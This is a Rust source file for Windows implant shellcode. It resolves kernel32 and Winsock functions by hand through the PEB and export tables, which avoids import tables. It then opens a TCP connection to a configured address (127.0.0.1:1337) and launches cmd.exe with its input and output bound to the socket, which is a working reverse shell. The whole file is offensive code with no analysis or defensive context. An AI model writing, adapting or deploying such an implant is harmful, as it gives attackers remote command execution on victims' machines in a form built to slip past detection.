#![no_std]
#![no_main]

extern crate panic_halt;

use core::{
    arch::{asm, global_asm},
    ffi::c_void,
    mem::MaybeUninit,
    net::Ipv4Addr,
    ptr::{null, null_mut},
};
use nocrt::strlen;
use windows_sys::{
    core::{PCSTR, PSTR},
    s, w,
    Win32::{
        Foundation::{BOOL, HMODULE, TRUE},
        Networking::WinSock::{
            AF_INET, IN_ADDR, IPPROTO_TCP, QOS, SOCKADDR, SOCKADDR_IN, SOCKET, SOCK_STREAM, WSABUF,
            WSADATA, WSAPROTOCOL_INFOA,
        },
        Security::SECURITY_ATTRIBUTES,
        System::{
            Diagnostics::Debug::{
                IMAGE_DATA_DIRECTORY, IMAGE_DIRECTORY_ENTRY_EXPORT, IMAGE_NT_HEADERS64,
            },
            Kernel::LIST_ENTRY,
            SystemServices::{
                IMAGE_DOS_HEADER, IMAGE_DOS_SIGNATURE, IMAGE_EXPORT_DIRECTORY, IMAGE_NT_SIGNATURE,
            },
            Threading::{
                PROCESS_CREATION_FLAGS, PROCESS_INFORMATION, STARTF_USESTDHANDLES, STARTUPINFOA,
            },
            WindowsProgramming::LDR_DATA_TABLE_ENTRY,
        },
    },
};

mod nocrt;

global_asm!(include_str!("main.s"));

extern "C" {
    fn _start();
}

#[link_section = ".text.implant"]
#[no_mangle]
pub extern "C" fn init() {
    unsafe { niam() };
}

static TARGET_ADDR: Ipv4Addr = Ipv4Addr::new(127, 0, 0, 1);
static TARGET_PORT: u16 = 1337;

#[no_mangle]
pub unsafe extern "C" fn niam() {
    let kernel32 = w!("KERNEL32.DLL");
    let name_len = str_u16_len(kernel32);
    let name_slice = unsafe { core::slice::from_raw_parts(kernel32, name_len) };

    let kernel32 = load_module(name_slice).unwrap();

    let load_library = module_function(kernel32, b"LoadLibraryA").unwrap();
    let load_library = core::mem::transmute::<_, LoadLibraryA>(load_library);

    let ws2_32 = load_library(s!("WS2_32.dll"));

    let wsa_startup = module_function(ws2_32, b"WSAStartup").unwrap();
    let wsa_startup = core::mem::transmute::<_, WSAStartup>(wsa_startup);

    let mut wsadata = MaybeUninit::<WSADATA>::zeroed();
    wsa_startup(0x0202, wsadata.as_mut_ptr());
    let _wsadata = wsadata.assume_init();

    let wsa_socket = module_function(ws2_32, b"WSASocketA").unwrap();
    let wsa_socket = core::mem::transmute::<_, WSASocketA>(wsa_socket);

    let socket = wsa_socket(AF_INET as _, SOCK_STREAM, IPPROTO_TCP, null(), 0, 0);

    let wsa_connect = module_function(ws2_32, b"WSAConnect").unwrap();
    let wsa_connect = core::mem::transmute::<_, WSAConnect>(wsa_connect);

    let sockaddr = SOCKADDR_IN {
        sin_family: AF_INET,
        sin_port: TARGET_PORT.to_be(),
        sin_addr: IN_ADDR {
            S_un: windows_sys::Win32::Networking::WinSock::IN_ADDR_0 {
                S_addr: TARGET_ADDR.to_bits().to_be(),
            },
        },
        sin_zero: [0; 8],
    };

    wsa_connect(
        socket,
        &sockaddr as *const SOCKADDR_IN as *const SOCKADDR,
        core::mem::size_of::<SOCKADDR_IN>() as _,
        null(),
        null_mut(),
        null(),
        null(),
    );

    let create_process = module_function(kernel32, b"CreateProcessA").unwrap();
    let create_process = core::mem::transmute::<_, CreateProcessA>(create_process);

    let startupinfo = MaybeUninit::<STARTUPINFOA>::zeroed();
    let mut startupinfo = startupinfo.assume_init();
    startupinfo.dwFlags = STARTF_USESTDHANDLES;
    startupinfo.hStdInput = socket as _;
    startupinfo.hStdOutput = socket as _;
    startupinfo.hStdError = socket as _;

    let mut process_information = MaybeUninit::<PROCESS_INFORMATION>::zeroed();
    let cmdline = s!("cmd.exe").cast_mut();

    create_process(
        null(),
        cmdline,
        null(),
        null(),
        TRUE,
        0,
        null(),
        null(),
        &startupinfo,
        process_information.as_mut_ptr(),
    );

    let _process_information = process_information.assume_init();
}

fn peb_inner() -> *mut windows_sys::Win32::System::Threading::PEB {
    let ptr: *mut windows_sys::Win32::System::Threading::PEB;
    unsafe {
        asm!(
            "mov {}, gs:[0x60]",
            out(reg) ptr
        );
    }
    ptr
}

fn str_u16_len(ptr: *const u16) -> usize {
    let mut cur = ptr;

    let mut len = 0;

    while unsafe { *cur } != b'\0' as u16 {
        len += 1;
        cur = unsafe { cur.add(1) };
    }
    len
}

unsafe fn get_dos_header(module_base_addr: *mut c_void) -> Result<*mut IMAGE_DOS_HEADER, ()> {
    let dos_header = module_base_addr as *mut IMAGE_DOS_HEADER;

    if (*dos_header).e_magic != IMAGE_DOS_SIGNATURE {
        return Err(());
    }

    Ok(dos_header)
}

unsafe fn get_nt_header(module_base_addr: *mut c_void) -> Result<*mut IMAGE_NT_HEADERS64, ()> {
    let dos_header = get_dos_header(module_base_addr)?;

    let nt_headers = module_base_addr
        .add((*dos_header).e_lfanew as _)
        .cast::<IMAGE_NT_HEADERS64>();

    if (*nt_headers).Signature != IMAGE_NT_SIGNATURE {
        return Err(());
    }

    Ok(nt_headers)
}

unsafe fn get_image_export_directory(
    module_base_addr: *mut c_void,
) -> Result<*mut IMAGE_EXPORT_DIRECTORY, ()> {
    let nt_header = get_nt_header(module_base_addr)?;

    let export_dir = (*nt_header).OptionalHeader.DataDirectory
        [IMAGE_DIRECTORY_ENTRY_EXPORT as usize] as IMAGE_DATA_DIRECTORY;

    let image_export_directory = (module_base_addr as usize + export_dir.VirtualAddress as usize)
        as *mut IMAGE_EXPORT_DIRECTORY;

    Ok(image_export_directory)
}

unsafe fn load_module(name: &[u16]) -> Option<*mut c_void> {
    let peb_handle = peb_inner();

    let ldr_data = (*peb_handle).Ldr;

    let entry = (*ldr_data).InMemoryOrderModuleList;
    let mut module_list = entry.Flink as *mut LDR_DATA_TABLE_ENTRY;

    while !module_list.is_null() {
        let dll_name_buffer = (*module_list).FullDllName.Buffer;
        let dll_name_len = (*module_list).FullDllName.Length as usize;

        let name_len = str_u16_len(dll_name_buffer).min(dll_name_len);
        let dll_name = core::slice::from_raw_parts(dll_name_buffer, name_len);

        if dll_name == name {
            return (*module_list).Reserved2[0].into();
        }

        let cursor = module_list as *mut LIST_ENTRY;

        module_list = (*cursor).Flink as *mut LDR_DATA_TABLE_ENTRY;
    }

    None
}

unsafe fn module_function(
    module_base_addr: *mut c_void,
    function_name: &[u8],
) -> Result<*mut c_void, ()> {
    let image_export_directory = get_image_export_directory(module_base_addr)?;

    let number_of_functions = (*image_export_directory).NumberOfFunctions;

    let address_of_names = module_base_addr.add((*image_export_directory).AddressOfNames as usize);

    let names =
        core::slice::from_raw_parts_mut(address_of_names as *mut u32, number_of_functions as _);

    let function_addresses = core::slice::from_raw_parts(
        module_base_addr.add((*image_export_directory).AddressOfFunctions as usize) as *const u32,
        number_of_functions as _,
    );

    let function_ordinals_addresses = core::slice::from_raw_parts(
        module_base_addr.add((*image_export_directory).AddressOfNameOrdinals as usize)
            as *const u16,
        number_of_functions as _,
    );

    for i in 0..number_of_functions {
        let name_offset = names[i as usize] as usize;
        let name_addr = module_base_addr.add(name_offset) as *const i8;

        let len = strlen(name_addr);
        let current_function_name = core::slice::from_raw_parts(name_addr.cast::<u8>(), len);

        if current_function_name == function_name {
            let ordinal = function_ordinals_addresses[i as usize] as usize;
            let func_ptr = module_base_addr.add(function_addresses[ordinal] as usize);
            return Ok(func_ptr);
        }
    }

    Err(())
}

#[no_mangle]
extern "C" fn rust_eh_personality() {
    unreachable!();
}

#[no_mangle]
extern "C" fn _Unwind_Resume() -> ! {
    unreachable!();
}

pub type WSAStartup =
    unsafe extern "system" fn(wversionrequested: u16, lpwsadata: *mut WSADATA) -> i32;

pub type WSASocketA = unsafe extern "system" fn(
    af: i32,
    typ: i32,
    protocol: i32,
    lpprotocolinfo: *const WSAPROTOCOL_INFOA,
    g: u32,
    dwflags: u32,
) -> SOCKET;

pub type WSAConnect = unsafe extern "system" fn(
    s: SOCKET,
    name: *const SOCKADDR,
    namelen: i32,
    lpcallerdata: *const WSABUF,
    lpcalleedata: *mut WSABUF,
    lpsqos: *const QOS,
    lpgqos: *const QOS,
) -> i32;

pub type LoadLibraryA = unsafe extern "system" fn(lplibfilename: PCSTR) -> HMODULE;

pub type CreateProcessA = unsafe extern "system" fn(
    lpapplicationname: PCSTR,
    lpcommandline: PSTR,
    lpprocessattributes: *const SECURITY_ATTRIBUTES,
    lpthreadattributes: *const SECURITY_ATTRIBUTES,
    binherithandles: BOOL,
    dwcreationflags: PROCESS_CREATION_FLAGS,
    lpenvironment: *const c_void,
    lpcurrentdirectory: PCSTR,
    lpstartupinfo: *const STARTUPINFOA,
    lpprocessinformation: *mut PROCESS_INFORMATION,
) -> BOOL;
